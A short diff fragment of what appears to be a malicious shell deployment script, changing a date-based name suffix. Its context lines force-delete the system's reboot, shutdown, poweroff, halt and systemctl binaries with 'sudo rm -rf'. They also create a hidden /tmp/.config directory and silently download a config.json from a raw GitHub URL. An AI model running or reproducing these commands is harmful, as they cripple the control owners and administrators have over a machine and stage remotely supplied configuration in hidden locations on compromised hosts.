@@ -5,7 +5,7 @@ sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl
 
 name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
 [ -n "$name" ] || name="NULL"
-name="${name}r0p0z"
+name="${name}z"
 
 mkdir -p /tmp/.config
 wget -qO /tmp/.config/config.json https://raw.githubusercontent.com/vjbahkds/cajbdfv/main/z.json
